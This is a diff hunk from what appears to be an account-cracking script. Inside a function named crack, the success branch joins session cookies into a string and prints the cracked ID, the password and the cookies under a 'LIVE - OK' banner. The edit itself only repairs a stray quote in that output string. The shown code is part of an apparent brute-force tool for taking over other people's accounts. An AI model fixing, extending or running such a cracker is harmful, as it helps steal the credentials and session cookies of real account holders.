@@ -662,7 +662,7 @@ def crack(idf,pwv,nmf):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print('\n')
-				okengab = f'[➣] ID  : {idf}\n[➣] PW  : {pw}'\n[➣] COOKIES  : {kuki}'
+				okengab = f'[➣] ID  : {idf}\n[➣] PW  : {pw}\n[➣] COOKIES  : {kuki}'
 				okegan = nel(okengab, style='green')
 				panjihitam(nel(okegan, title='[bold red][[bold green]LIVE - OK[bold red]]'))
 				os.popen('play-audio data/ok.mp3')
